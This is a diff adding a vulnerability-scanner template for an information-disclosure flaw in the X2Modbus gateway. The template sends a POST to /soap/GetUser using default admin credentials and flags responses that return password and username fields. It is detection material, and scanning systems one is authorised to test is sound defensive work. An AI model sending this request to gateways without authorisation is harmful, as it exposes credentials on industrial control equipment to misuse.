@@ -1,0 +1,31 @@
+id: poc-yaml-x2modbus-getuser-info-leak
+info:
+  name: X2Modbus Gateway GetUser Sensitive Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak,x2modbus
+http:
+  - raw:
+      - |
+        POST /soap/GetUser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        <GetUser><User Name="admin" Password="admin"/></GetUser>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<PassWord>"
+      - type: regex
+        part: body
+        regex:
+          - "<UserName>[0-9a-zA-Z]+</UserName>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
